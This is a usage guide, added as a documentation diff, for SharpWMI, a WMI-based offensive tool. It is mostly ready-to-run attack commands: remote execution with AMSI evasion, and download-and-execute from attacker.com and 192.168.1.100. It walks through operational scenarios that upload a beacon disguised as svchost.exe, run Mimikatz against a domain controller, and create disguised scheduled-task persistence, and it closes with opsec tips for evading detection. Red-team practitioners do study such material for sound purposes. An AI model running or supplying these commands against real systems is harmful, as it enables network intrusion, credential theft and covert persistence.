@@ -1,0 +1,555 @@
+---
+title: 'Usage Guide'
+description: 'Practical usage examples and workflows for SharpWMI'
+icon: 'book'
+---
+
+## Getting Started
+
+SharpWMI uses a consistent command-line syntax with an `action` parameter to specify the operation:
+
+```bash
+SharpWMI.exe action=<ACTION> [parameters...]
+```
+
+<Tip>
+  All remote operations support optional `username` and `password` parameters for alternate credentials. If `computername` is not specified, the action targets localhost.
+</Tip>
+
+## Basic Syntax
+
+<Tabs>
+  <Tab title="Local Operations">
+    ```bash
+    # Local WMI query
+    SharpWMI.exe action=query query="select * from win32_service"
+
+    # Local query with custom namespace
+    SharpWMI.exe action=query query="SELECT * FROM AntiVirusProduct" namespace="root\SecurityCenter2"
+    ```
+  </Tab>
+
+  <Tab title="Remote Operations">
+    ```bash
+    # Remote query (current credentials)
+    SharpWMI.exe action=query computername=target.domain.com query="select * from win32_service"
+
+    # Remote query (alternate credentials)
+    SharpWMI.exe action=query computername=target.domain.com query="select * from win32_service" username="DOMAIN\user" password="Password123!"
+
+    # Multiple targets
+    SharpWMI.exe action=query computername=server1,server2,server3 query="select * from win32_process"
+    ```
+  </Tab>
+</Tabs>
+
+## Enumeration Workflows
+
+### User Enumeration
+
+Identify logged-on users across the network:
+
+```bash
+# Single target
+SharpWMI.exe action=loggedon computername=workstation.domain.com
+
+# Domain controller
+SharpWMI.exe action=loggedon computername=dc.domain.com
+
+# Multiple systems
+SharpWMI.exe action=loggedon computername=dc.domain.com,fileserver.domain.com,sql.domain.com
+```
+
+**Example Output:**
+```
+workstation     : DOMAIN\Administrator
+workstation     : DOMAIN\jdoe
+workstation     : DOMAIN\serviceaccount
+```
+
+### Process Enumeration
+
+List running processes with owner information:
+
+```bash
+# Local processes
+SharpWMI.exe action=ps
+
+# Remote processes
+SharpWMI.exe action=ps computername=target.domain.com
+
+# With credentials
+SharpWMI.exe action=ps computername=target.domain.com username="DOMAIN\admin" password="Password123!"
+```
+
+**Example Output:**
+```
+   PID |                           Name |                     Owner | CommandLine
+  1234 |                   chrome.exe   |         DOMAIN\jdoe       | "C:\Program Files\Google\Chrome\Application\chrome.exe"
+  5678 |                 powershell.exe |    DOMAIN\Administrator   | powershell.exe -NoProfile
+```
+
+### Firewall Enumeration
+
+Enumerate firewall rules and open ports:
+
+```bash
+# Local firewall rules
+SharpWMI.exe action=firewall computername=localhost
+
+# Remote firewall enumeration
+SharpWMI.exe action=firewall computername=webserver.domain.com
+
+# With credentials
+SharpWMI.exe action=firewall computername=webserver.domain.com username="DOMAIN\admin" password="Password123!"
+```
+
+### Advanced WMI Queries
+
+<Accordion title="Network Connections (Windows 10+)">
+  ```bash
+  SharpWMI.exe action=query computername=target.domain.com query="Select LocalPort,OwningProcess from MSFT_NetTCPConnection" namespace="ROOT\StandardCIMV2"
+  ```
+
+  Enumerates TCP connections similar to `netstat`.
+</Accordion>
+
+<Accordion title="Installed Software">
+  ```bash
+  SharpWMI.exe action=query computername=target.domain.com query="SELECT Name,Version,Vendor FROM Win32_Product"
+  ```
+
+  Lists installed software products.
+</Accordion>
+
+<Accordion title="User Accounts">
+  ```bash
+  SharpWMI.exe action=query computername=target.domain.com query="SELECT Name,LocalAccount,Disabled FROM Win32_UserAccount WHERE LocalAccount=True"
+  ```
+
+  Enumerates local user accounts.
+</Accordion>
+
+<Accordion title="Scheduled Tasks">
+  ```bash
+  SharpWMI.exe action=query computername=target.domain.com query="SELECT * FROM Win32_ScheduledJob"
+  ```
+
+  Lists scheduled tasks.
+</Accordion>
+
+<Accordion title="Shares">
+  ```bash
+  SharpWMI.exe action=query computername=target.domain.com query="SELECT Name,Path,Description FROM Win32_Share"
+  ```
+
+  Enumerates network shares.
+</Accordion>
+
+<Accordion title="AntiVirus Detection">
+  ```bash
+  SharpWMI.exe action=query query="SELECT displayName,pathToSignedProductExe,pathToSignedReportingExe FROM AntiVirusProduct" namespace="root\SecurityCenter2"
+  ```
+
+  Detects installed antivirus products (Windows 7-10).
+</Accordion>
+
+## Execution Workflows
+
+### Basic Process Creation
+
+Execute commands on remote systems:
+
+```bash
+# Simple command execution
+SharpWMI.exe action=exec computername=target.domain.com command="notepad.exe"
+
+# PowerShell command
+SharpWMI.exe action=exec computername=target.domain.com command="powershell.exe -enc ZQBjAGgAbwAgACIASABlAGwAbABvACIA"
+
+# With alternate credentials
+SharpWMI.exe action=exec computername=target.domain.com command="whoami" username="DOMAIN\admin" password="Password123!"
+```
+
+### Command Output Retrieval
+
+Capture command output from remote execution:
+
+```bash
+# Execute and retrieve output
+SharpWMI.exe action=exec computername=target.domain.com command="whoami" result=true
+
+# With AMSI evasion
+SharpWMI.exe action=exec computername=target.domain.com command="powershell -c Get-Process" result=true amsi=disable
+
+# More complex commands
+SharpWMI.exe action=exec computername=target.domain.com command="powershell -c 'Get-LocalGroupMember Administrators'" result=true amsi=disable
+```
+
+<Note>
+  The `result=true` option stores command output in a WMI environment variable, retrieves it, and cleans up. This adds execution time but provides valuable feedback.
+</Note>
+
+### VBScript Execution
+
+Execute VBScript payloads through WMI event subscriptions:
+
+<Tabs>
+  <Tab title="Execute Command">
+    ```bash
+    # Simple command via VBScript
+    SharpWMI.exe action=executevbs computername=target.domain.com command="notepad.exe" eventname="Update"
+
+    # With AMSI evasion
+    SharpWMI.exe action=executevbs computername=target.domain.com command="powershell.exe -c Get-Process" eventname="Debug" amsi=disable
+    ```
+  </Tab>
+
+  <Tab title="Download & Execute">
+    ```bash
+    # Download PowerShell script and execute via stdin
+    SharpWMI.exe action=executevbs computername=target.domain.com url="http://attacker.com/script.ps1" eventname="Update"
+
+    # Download binary, save to disk, and execute
+    SharpWMI.exe action=executevbs computername=target.domain.com url="http://attacker.com/payload.exe,%TEMP%\update.exe" eventname="Update"
+
+    # Download binary and execute custom command
+    SharpWMI.exe action=executevbs computername=target.domain.com url="http://attacker.com/beacon.exe,%TEMP%\svc.exe" command="%TEMP%\svc.exe -c 192.168.1.100" eventname="Update"
+    ```
+  </Tab>
+
+  <Tab title="Execute Script File">
+    ```bash
+    # Execute VBScript from file
+    SharpWMI.exe action=executevbs computername=target.domain.com script="C:\payloads\script.vbs" eventname="Update"
+
+    # Execute inline VBScript
+    SharpWMI.exe action=executevbs computername=target.domain.com script="CreateObject(\"WScript.Shell\").Run(\"notepad.exe\")" eventname="Update"
+
+    # Execute base64-encoded script
+    SharpWMI.exe action=executevbs computername=target.domain.com scriptb64="Q3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikuUnVuKCJub3RlcGFkLmV4ZSIp" eventname="Update"
+    ```
+  </Tab>
+
+  <Tab title="Timing Options">
+    ```bash
+    # Custom trigger and timeout (in seconds)
+    SharpWMI.exe action=executevbs computername=target.domain.com command="notepad.exe" eventname="Update" trigger=5 timeout=10
+
+    # trigger: Time before script executes (default: 10s)
+    # timeout: Script kill timeout (default: 12s)
+    ```
+  </Tab>
+</Tabs>
+
+<Warning>
+  VBScript execution via WMI event subscriptions creates persistence artifacts that must be cleaned up. SharpWMI automatically removes the event filter, consumer, and binding after execution.
+</Warning>
+
+## File Operations
+
+### File Upload
+
+Upload files to remote systems via WMI:
+
+```bash
+# Basic file upload
+SharpWMI.exe action=upload computername=target.domain.com source="C:\payloads\beacon.exe" dest="C:\Windows\temp\svchost.exe"
+
+# With AMSI evasion
+SharpWMI.exe action=upload computername=target.domain.com source="beacon.exe" dest="C:\Windows\temp\svchost.exe" amsi=disable
+
+# Multiple targets
+SharpWMI.exe action=upload computername=server1,server2,server3 source="implant.exe" dest="C:\temp\update.exe" amsi=disable
+```
+
+**How it works:**
+1. Creates temporary WMI class with file data in property
+2. Executes PowerShell on target to read from WMI class
+3. Writes bytes to disk
+4. Verifies upload success
+5. Removes temporary WMI class
+
+<Tip>
+  File upload is useful when SMB file shares are blocked or monitored. It operates entirely over WMI/RPC channels.
+</Tip>
+
+### MSI Installation
+
+Install MSI packages remotely:
+
+```bash
+# Install MSI file
+SharpWMI.exe action=install computername=target.domain.com path="\\fileserver\packages\software.msi"
+
+# With AMSI evasion
+SharpWMI.exe action=install computername=target.domain.com path="C:\temp\package.msi" amsi=disable
+
+# With credentials
+SharpWMI.exe action=install computername=target.domain.com path="\\share\app.msi" username="DOMAIN\admin" password="Password123!"
+```
+
+<Note>
+  The MSI file must be accessible from the target system. Use UNC paths or ensure the file exists locally on the target.
+</Note>
+
+## Process Management
+
+### Terminate Processes
+
+Kill processes by name or PID:
+
+```bash
+# Terminate by process name
+SharpWMI.exe action=terminate process=notepad computername=target.domain.com
+
+# Terminate by PID
+SharpWMI.exe action=terminate process=1234 computername=target.domain.com
+
+# Multiple targets
+SharpWMI.exe action=terminate process=chrome computername=ws1,ws2,ws3
+
+# With credentials
+SharpWMI.exe action=terminate process=explorer username="DOMAIN\admin" password="Password123!" computername=target.domain.com
+```
+
+<Warning>
+  Process termination finds and kills the **first matching process only**. For multiple instances, you'll need to run the command multiple times.
+</Warning>
+
+## Environment Variable Management
+
+### Get Environment Variables
+
+Retrieve environment variable values:
+
+```bash
+# Get all environment variables
+SharpWMI.exe action=getenv computername=target.domain.com
+
+# Get specific variable
+SharpWMI.exe action=getenv name=PATH computername=target.domain.com
+
+# Multiple variables
+SharpWMI.exe action=getenv name=USERNAME,COMPUTERNAME,USERDOMAIN computername=target.domain.com
+```
+
+### Set Environment Variables
+
+Create or modify environment variables:
+
+```bash
+# Set environment variable
+SharpWMI.exe action=setenv name=TESTING value="TRUE" computername=target.domain.com
+
+# Set with credentials
+SharpWMI.exe action=setenv name=CONFIG_PATH value="C:\configs" computername=target.domain.com username="DOMAIN\admin" password="Password123!"
+```
+
+<Note>
+  Environment variables are set in the user context. Use this for data exfiltration or configuration settings.
+</Note>
+
+### Delete Environment Variables
+
+Remove environment variables:
+
+```bash
+# Delete environment variable
+SharpWMI.exe action=delenv name=TESTING computername=target.domain.com
+
+# With credentials
+SharpWMI.exe action=delenv name=CONFIG_PATH computername=target.domain.com username="DOMAIN\admin" password="Password123!"
+```
+
+## Operational Scenarios
+
+<AccordionGroup>
+  <Accordion title="Scenario 1: Initial Access and Enumeration">
+    ```bash
+    # 1. Verify access and enumerate logged-on users
+    SharpWMI.exe action=loggedon computername=target.domain.com
+
+    # 2. Check running processes for interesting targets
+    SharpWMI.exe action=ps computername=target.domain.com
+
+    # 3. Enumerate network connections
+    SharpWMI.exe action=query computername=target.domain.com query="Select LocalPort,RemoteAddress,OwningProcess from MSFT_NetTCPConnection WHERE State=5" namespace="ROOT\StandardCIMV2"
+
+    # 4. Check firewall configuration
+    SharpWMI.exe action=firewall computername=target.domain.com
+
+    # 5. Identify installed software
+    SharpWMI.exe action=query computername=target.domain.com query="SELECT Name,Version FROM Win32_Product WHERE Name LIKE '%AV%' OR Name LIKE '%Security%'"
+    ```
+  </Accordion>
+
+  <Accordion title="Scenario 2: Lateral Movement with File Upload">
+    ```bash
+    # 1. Upload payload
+    SharpWMI.exe action=upload computername=target.domain.com source="beacon.exe" dest="C:\Windows\temp\svchost.exe" amsi=disable username="DOMAIN\admin" password="Password123!"
+
+    # 2. Execute uploaded payload
+    SharpWMI.exe action=exec computername=target.domain.com command="C:\Windows\temp\svchost.exe" username="DOMAIN\admin" password="Password123!"
+
+    # 3. Verify execution
+    SharpWMI.exe action=ps computername=target.domain.com username="DOMAIN\admin" password="Password123!"
+    ```
+  </Accordion>
+
+  <Accordion title="Scenario 3: Credential Harvesting">
+    ```bash
+    # 1. Execute Mimikatz via encoded command
+    SharpWMI.exe action=exec computername=dc.domain.com command="powershell -enc <base64_mimikatz>" result=true amsi=disable username="DOMAIN\admin" password="Password123!"
+
+    # 2. Alternative: VBScript download and execute
+    SharpWMI.exe action=executevbs computername=dc.domain.com url="http://192.168.1.100/invoke-mimikatz.ps1" eventname="WindowsUpdate" amsi=disable username="DOMAIN\admin" password="Password123!"
+
+    # 3. Retrieve results via environment variable (if implemented)
+    SharpWMI.exe action=getenv name=MIMIKATZ_OUTPUT computername=dc.domain.com username="DOMAIN\admin" password="Password123!"
+    ```
+  </Accordion>
+
+  <Accordion title="Scenario 4: Mass Enumeration">
+    ```bash
+    # Create target list
+    $targets = "dc.domain.com,fs1.domain.com,fs2.domain.com,sql.domain.com,web1.domain.com"
+
+    # Enumerate logged-on users across all systems
+    SharpWMI.exe action=loggedon computername=$targets
+
+    # Check for specific process across all systems
+    SharpWMI.exe action=query computername=$targets query="SELECT ProcessId,Name,ExecutablePath FROM Win32_Process WHERE Name='powershell.exe' OR Name='cmd.exe'"
+
+    # Enumerate administrator group members
+    SharpWMI.exe action=query computername=$targets query="SELECT * FROM Win32_GroupUser WHERE GroupComponent=""Win32_Group.Domain='DOMAIN',Name='Administrators'"""
+    ```
+  </Accordion>
+
+  <Accordion title="Scenario 5: Persistence via Scheduled Task">
+    ```bash
+    # 1. Upload payload
+    SharpWMI.exe action=upload computername=target.domain.com source="persist.exe" dest="C:\Windows\System32\WindowsUpdate.exe" amsi=disable
+
+    # 2. Create scheduled task via WMI
+    SharpWMI.exe action=exec computername=target.domain.com command="schtasks /create /tn WindowsUpdateCheck /tr C:\Windows\System32\WindowsUpdate.exe /sc daily /st 09:00" result=true
+
+    # 3. Verify scheduled task creation
+    SharpWMI.exe action=query computername=target.domain.com query="SELECT * FROM Win32_ScheduledJob"
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Best Practices
+
+<CardGroup cols={2}>
+  <Card title="Operational Security" icon="user-secret">
+    - Use AMSI evasion for PowerShell/VBScript operations
+    - Clean up artifacts (environment variables, WMI classes)
+    - Randomize event names for VBScript execution
+    - Use result=true sparingly (creates more artifacts)
+  </Card>
+
+  <Card title="Credential Management" icon="key">
+    - Avoid hardcoding credentials in commands
+    - Use domain admin accounts only when necessary
+    - Consider using current user context where possible
+    - Rotate compromised credentials promptly
+  </Card>
+
+  <Card title="Network Operations" icon="network-wired">
+    - Test connectivity before mass operations
+    - Handle timeouts gracefully
+    - Limit concurrent targets to avoid detection
+    - Monitor for defensive responses
+  </Card>
+
+  <Card title="Error Handling" icon="triangle-exclamation">
+    - Check for access denied errors
+    - Verify WMI service is running on targets
+    - Ensure firewall allows RPC/DCOM traffic
+    - Validate credentials before mass operations
+  </Card>
+</CardGroup>
+
+## Common Issues and Solutions
+
+<AccordionGroup>
+  <Accordion title="Access Denied">
+    **Error:** Access denied when connecting to remote system
+
+    **Causes:**
+    - Insufficient privileges
+    - Wrong credentials
+    - WMI permissions not granted
+    - UAC filtering (local admin but not elevated)
+
+    **Solutions:**
+    - Verify credentials with `username` and `password`
+    - Use domain admin account
+    - Add user to local Administrators group on target
+    - Disable UAC remote restrictions (if appropriate)
+  </Accordion>
+
+  <Accordion title="RPC Server Unavailable">
+    **Error:** The RPC server is unavailable
+
+    **Causes:**
+    - Target system is offline
+    - Firewall blocking RPC/DCOM
+    - WMI service not running
+
+    **Solutions:**
+    - Verify target is online: `ping target.domain.com`
+    - Check firewall rules
+    - Ensure Windows Management Instrumentation service is running
+    - Test with local WMI query first
+  </Accordion>
+
+  <Accordion title="No Results Returned">
+    **Error:** Command executes but no results/output
+
+    **Causes:**
+    - Insufficient privileges for result retrieval
+    - Environment variable creation failed
+    - Command didn't produce output
+
+    **Solutions:**
+    - Verify admin access to target
+    - Check command syntax
+    - Use `result=true` only with commands that produce output
+    - Test command locally first
+  </Accordion>
+
+  <Accordion title="AMSI Evasion Failed">
+    **Error:** AMSI still blocks execution despite `amsi=disable`
+
+    **Causes:**
+    - Insufficient privileges to modify registry
+    - AMSI evasion detected by EDR
+    - Registry protection in place
+
+    **Solutions:**
+    - Verify admin privileges
+    - Use alternative AMSI bypass methods
+    - Consider different execution techniques
+    - Test AMSI bypass manually first
+  </Accordion>
+</AccordionGroup>
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="Action Reference" icon="book" href="/ghostpack-docs/SharpWMI-mdx/actions/query">
+    Explore all available actions in detail
+  </Card>
+  <Card title="WMI Queries" icon="database" href="/ghostpack-docs/SharpWMI-mdx/actions/query">
+    Advanced WMI query examples
+  </Card>
+  <Card title="Remote Execution" icon="terminal" href="/ghostpack-docs/SharpWMI-mdx/actions/exec">
+    Process creation techniques
+  </Card>
+  <Card title="VBScript Execution" icon="file-code" href="/ghostpack-docs/SharpWMI-mdx/actions/executevbs">
+    VBScript payload delivery
+  </Card>
+</CardGroup>
